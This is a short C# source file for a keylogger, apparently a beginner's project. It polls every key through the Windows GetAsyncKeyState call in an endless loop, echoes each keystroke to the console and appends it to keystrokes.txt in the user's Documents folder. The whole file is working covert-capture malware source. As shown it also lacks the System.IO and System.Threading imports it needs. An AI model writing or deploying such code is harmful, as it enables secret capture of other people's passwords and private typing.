using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static string key = " "; //string to hold all key strokes

        static void Main(string[] args)
        {

            //creating a file to save the data in
            String filepath= Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
                //comment
            }

            string path = (filepath + @"\keystrokes.txt");

       /*     if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    //creating file
                }
            }*/
          

            //1 capturing key strokes and display them to the console.

            while (true)
            {
                 Thread.Sleep(60);

                for (int k = 0; k < 127; k++)
                {
                    int keyState = GetAsyncKeyState(k);

                    if (keyState == 32768)
                    {
                                     
                            Console.Write((char)k + " ");
                     
                        //2) Store the strokes into a text file
                        using (StreamWriter sw= File.AppendText(path))
                        {
                            sw.Write((char)k);
                        }
                    }
                    }
                }
            }
        }

    }

